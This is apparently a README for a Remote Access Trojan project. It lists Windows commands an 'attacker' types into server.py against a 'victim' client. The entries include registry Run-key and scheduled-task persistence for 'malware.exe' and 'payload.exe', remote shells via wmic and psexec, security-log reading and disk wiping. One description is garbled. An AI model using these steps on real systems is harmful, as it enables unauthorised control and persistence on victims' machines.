# List of useful commands for attacker (Windows) using Remote Access Trojan (RAT)

### 1. Basic System Information

| Command        | Description           
| ------------- |:-------------:| 
| systeminfo      | Lists OS, hardware, and patch details | 
| hostname      | 	Shows the computer name      |  
| whoami        |   Displays current user |
| wmic csproduct get name | are neat      |   



### 2. Network Diagnostics

| Command        | Description           
| ------------- |:-------------:| 
| ipconfig /all      | Shows full network configuration | 
| netstat -ano      | 	Lists all active connections and portse      |  
| ping google.com        |   Tests internet connectivity |
| tracert 8.8.8.8 | 	Traces network route to a host      |   


### 3.  User & Permission Management

| Command        | Description           
| ------------- |:-------------:| 
| net user      | Lists all user accounts | 
| net localgroup administrators      | 	Shows admin users      |  
| whoami /priv        |   	Checks current user privileges |


### 4. File System Operations

| Command        | Description           
| ------------- |:-------------:| 
| dir C:\      | Lists files in a directory | 
| type C:\file.txt      | 	Views file contents      |  
| del /s C:\temp\file.txt        |   	Deletes a file |
| copy C:\file.txt C:\backup\        |   	Copies files |



### 5. Process & Service Control
| Command	| Description |
| ------------- |:-------------:| 
| tasklist |	Lists running processes |
| taskkill /IM notepad.exe /F |	Force-closes a process |
| sc query |	Lists all Windows services |
| net start |	Shows running services |



### 6. 6. Security & Logs

| Command        | Description           
| ------------- |:-------------:| 
| wevtutil qe Security /rd:true /f:text |	Reads security event logs |
| auditpol /get /category:*	| Checks audit policies |
| cipher /w:C:\ | 	Securely wipes free space |


### 7. Persistence (For Ethical Testing)
| Command        | Description           
| ------------- |:-------------:| 
| schtasks /create /tn "TaskName" /tr "C:\payload.exe" /sc hourly	 | Creates a scheduled task |
| reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "MyApp" /t REG_SZ /d "C:\malware.exe"	| Adds to startup (registry) |



### 8. Remote Administration (Admin Rights Required)

| Command        | Description           
| ------------- |:-------------:| 
| shutdown /r /t 60 /c "Restarting for updates" |	Reboots the system |
| wmic /node:"CLIENT_IP" process call create "cmd.exe"	| Runs commands remotely (WMIC) |
| psexec \\CLIENT_IP -u USER -p PASS cmd.exe	| Remote shell (PsExec from Sysinternals) |









---

Important:

In Visual Studio Code terminal,
1. Run the client.py (Client OS / Victim OS) 
2. Run the server.py (Server / Attacker OS)
3. Do the above commands in `server.py`  terminal:

![image](https://github.com/user-attachments/assets/61be0116-a17a-4739-ae48-9feed7196263)













